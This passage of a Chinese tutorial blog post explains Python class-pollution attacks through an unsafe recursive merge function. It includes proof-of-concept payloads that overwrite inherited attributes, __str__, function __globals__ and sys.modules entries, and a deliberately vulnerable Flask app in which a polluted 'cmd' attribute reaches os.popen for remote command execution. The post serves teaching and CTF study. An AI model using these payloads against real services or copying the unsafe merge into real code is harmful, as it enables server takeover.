title="污染过程解析"></a>污染过程解析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">father</span>:<br>    secret=<span class="hljs-string">&quot;hello&quot;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_a</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_b</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src,dst</span>):<br>    <span class="hljs-comment"># 遍历字典中的所有键值对</span><br>    <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-comment"># 检查dst是否为字典</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst,<span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-comment"># 如果存在键k并且v是一个字典</span><br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v,dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k]=v<br>                <span class="hljs-comment"># 如果dst是一个对象并且有属性k</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst,k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v,<span class="hljs-built_in">getattr</span>(dst,k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 将v赋值给k</span><br>            <span class="hljs-built_in">setattr</span>(dst,k,v)<br>    <br>instance=son_b()<br>payload=&#123;<br>    <span class="hljs-string">&quot;__class__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__base__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-string">&quot;world&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-built_in">print</span>(son_a.secret)<br><span class="hljs-built_in">print</span>(instance.secret)<br><br>merge(payload,instance)<br><span class="hljs-built_in">print</span>(son_a.secret)<br><span class="hljs-built_in">print</span>(instance.secret)<br></code></pre></td></tr></table></figure><p>我们debug一下</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250309231033660.png" alt="image-20250309231033660"></p><p>可以看到我们的键为<code>&#39;__class__&#39;</code>,值为<code>&#123;&#39;__base__&#39;:&#123;&#39;secret&#39;:&#39;world&#39;&#125;&#125;</code>,下一步由于<code>dst</code>不为字典直接到了<code>elif</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250309231142951.png" alt="image-20250309231142951"></p><p>继续之后，发现键为<code>&#39;__base__&#39;</code>,值为<code>&#123;&#39;secret&#39;:&#39;world&#39;&#125;</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250309231215167.png" alt="image-20250309231215167"></p><p><code>dst</code>还是不是字典，继续下一步</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250309231422466.png" alt="image-20250309231422466"></p><p>现在键为<code>&#39;secret&#39;</code>，值为<code>&#39;world&#39;</code>，值不是字典了，直接跳到<code>else</code>所以直接跳转到了<code>setattr</code>，进行赋值</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250309231536024.png" alt="image-20250309231536024"></p><p>继续下一步</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250309231717896.png" alt="image-20250309231717896"></p><p>可以看见<code>dst</code>直接就指向地址了</p><p>那么我们就成功的通过当前类的<code>__base__</code>去污染了<code>secret</code>(现在这三个类的<strong>secret</strong>都是<strong>world</strong>)，不过这仅仅只是一个内置属性，那能不能实现最大的利用直接污染<code>object</code>呢</p><p>前面几步都在正常进行，可是到了后面，发现个问题，也就是我们刚才所有的回退那两步发现没了，从而直接报错，也就是说污染失败，得出结论</p><p><strong>object的属性不能污染</strong></p><p>不仅仅可以污染这些属性，而且还可以污染内置属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">father</span>:<br>    secret = <span class="hljs-string">&quot;hello&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_a</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_b</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><br>instance = son_b()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__class__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__base__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;secret&quot;</span>: <span class="hljs-string">&quot;world&quot;</span>,<br>            <span class="hljs-string">&quot;__str__&quot;</span>:<span class="hljs-string">&quot;polluted!&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">print</span>(father.__str__)<br>merge(payload,instance)<br><span class="hljs-built_in">print</span>(father.__str__)<br><br></code></pre></td></tr></table></figure><p>成功污染内置属性<code>__str__</code>为<code>polluted</code>了</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>看一个简单无脑的<code>demo</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(v, <span class="hljs-built_in">dict</span>):<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(v, <span class="hljs-built_in">dict</span>):<br>            merge(<span class="hljs-built_in">getattr</span>(dst, k), v)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, cmd</span>):<br>        <span class="hljs-variable language_">self</span>.cmd = cmd<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> os.popen(<span class="hljs-variable language_">self</span>.cmd).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/merge_and_execute&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge_and_execute</span>():<br>    data = request.json<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;cmd&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Invalid input&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>    cmd_data = data[<span class="hljs-string">&#x27;cmd&#x27;</span>]<br>    a = Demo(<span class="hljs-string">&#x27;echo Hello&#x27;</span>)<br>    merge(cmd_data, a)<br>    <br>    result = a.execute()<br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;result&quot;</span>: result&#125;)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,debug=<span class="hljs-literal">True</span>)<br><br><br></code></pre></td></tr></table></figure><p>直接污染进行rce</p><p>传入</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;whoami&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>成功污染<code>demo</code>属性</p><h2 id="属性污染以及寻找-merge"><a href="#属性污染以及寻找-merge" class="headerlink" title="属性污染以及寻找(merge)"></a>属性污染以及寻找(merge)</h2><p>类似于<code>ssti</code>的模式，在<code>ssti</code>中我们先通过<code>init</code>初始化属性，在通过<code>globals</code>访问全局变量查找模块,但是在原型链污染中，如果我们不进行重写<code>__init__</code>的话，是找不到的</p><h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>如上面的，通过继承关系写出<code>poc</code>即可，当然与此同时，并不只是我们自定义的属性可以污染，还有内置属性也可以，这里可以以这个属性为例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">father</span>:<br>    secret = <span class="hljs-string">&quot;hello&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_a</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_b</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><br>instance = son_b()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__class__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__base__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;secret&quot;</span>: <span class="hljs-string">&quot;hacker&quot;</span>,<br>            <span class="hljs-string">&quot;__str__&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">print</span>(father.__str__)<br>merge(payload,instance)<br><span class="hljs-built_in">print</span>(father.__str__)<br></code></pre></td></tr></table></figure><p>成功污染</p><h3 id="非继承"><a href="#非继承" class="headerlink" title="非继承"></a>非继承</h3><h4 id="globals"><a href="#globals" class="headerlink" title="globals"></a>globals</h4><p>我们在<code>flask</code>中进行<code>SSTI</code>注入的时候一般就会先去寻找<code>globals</code>，这里也是一样，我们直接去找就行了，不过注意的一点就是，如果我们不进行重写<code>__init__</code>的话，是找不到的</p><p>未重写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>:<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(MyClass.__init__))<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span>(MyClass.__init__.__globals__)<br><span class="hljs-comment"># 访问不存在的属性会抛出AttributeError</span><br><span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br>    <br><span class="hljs-comment"># &lt;class &#x27;wrapper_descriptor&#x27;&gt;</span><br><span class="hljs-comment"># &#x27;wrapper_descriptor&#x27; object has no attribute &#x27;__globals__&#x27;</span><br></code></pre></td></tr></table></figure><p>重写过后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.x = <span class="hljs-number">10</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(MyClass.__init__))  <br><span class="hljs-built_in">print</span>(MyClass.__init__.__globals__)  <br><span class="hljs-comment"># &lt;class &#x27;function&#x27;&gt;</span><br><span class="hljs-comment"># &#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x000001BDD0B71700&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;test.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;MyClass&#x27;: &lt;class &#x27;__main__.MyClass&#x27;&gt;&#125;</span><br></code></pre></td></tr></table></figure><p>同时这里我们也发现，当其未被重写时，它的类型是 <code>wrapper_descriptor</code>，一个内置方法，是没有全局变量的概率的，，被重写会变为<code>function</code>，一个函数就有全局变量的概率了，有<code>__globals__</code>，请看<code>demo</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">demo</span>():<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(demo.__globals__ == <span class="hljs-built_in">globals</span>() == MyClass.__init__.__globals__)<br></code></pre></td></tr></table></figure><p>都是访问当前的全局变量</p><p>我们的目的就是拿到<code>__globals</code></p><p>看一个简单的demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">father</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br>    secret = <span class="hljs-string">&quot;hello&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_a</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_b</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># 遍历字典中的所有键值对</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-comment"># 检查dst是否为字典</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-comment"># 如果存在键k并且v是一个字典</span><br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>                <span class="hljs-comment"># 如果dst是一个对象并且有属性k</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 将v赋值给k</span><br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br>test=<span class="hljs-string">&quot;test&quot;</span><br>a = son_a()<br>b = son_b()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span>,<br>            <span class="hljs-string">&quot;father&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span><br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><br><span class="hljs-built_in">print</span>(a.secret)<br><span class="hljs-built_in">print</span>(test)<br>merge(payload, b)<br><span class="hljs-built_in">print</span>(a.secret)<br><span class="hljs-built_in">print</span>(father.secret)<br><span class="hljs-built_in">print</span>(test)<br></code></pre></td></tr></table></figure><p>成功污染了，但是实际情况中，常常是存在于内置模块或者是第三方模块之中，此时我们就不太好找关系了。不过还是有很多办法的</p><h4 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h4><p>那么就要使用<code>sys</code>，因为<code>sys</code>模块的<code>modules</code>属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块，并随着模块的导入而动态更新</p><p>看个简单的demo</p><p><code>test.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    secret=<span class="hljs-string">&quot;123456&quot;</span><br></code></pre></td></tr></table></figure><p><code>demo.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> test<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">a</span>():<br>    secret = <span class="hljs-string">&quot;nonono&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">b</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># 遍历字典中的所有键值对</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-comment"># 检查dst是否为字典</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-comment"># 如果存在键k并且v是一个字典</span><br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>                <span class="hljs-comment"># 如果dst是一个对象并且有属性k</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 将v赋值给k</span><br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;sys&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;modules&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;test&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;test&quot;</span>: &#123;<br>                            <span class="hljs-string">&quot;secret&quot;</span>: <span class="hljs-string">&quot;hacker&quot;</span><br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>b = b()<br><br><span class="hljs-built_in">print</span>(test.test.secret)<br>merge(payload, b)<br><span class="hljs-built_in">print</span>(test.test.secret)<br><br></code></pre></td></tr></table></figure><p>成功污染第三方模块<code>test</code>模块的<code>secret</code></p><h4 id="Loader加载器"><a href="#Loader加载器" class="headerlink" title="Loader加载器"></a>Loader加载器</h4><p><code>__loader__</code> 是一个属性，它存在于每个已导入的模块对象中。这个属性指向一个加载器对象，该对象负责加载该模块。在一些场景中常常伴有着<code>importlib</code>模块的使用，那么这个时候我们就可以使用<code>loader</code>加载器来进行<code>sys</code>模块的加载从而达到目的</p><p>我们简单的看下</p><p><strong>BuiltinImporter</strong></p><ul><li>用于内置模块的加载</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span 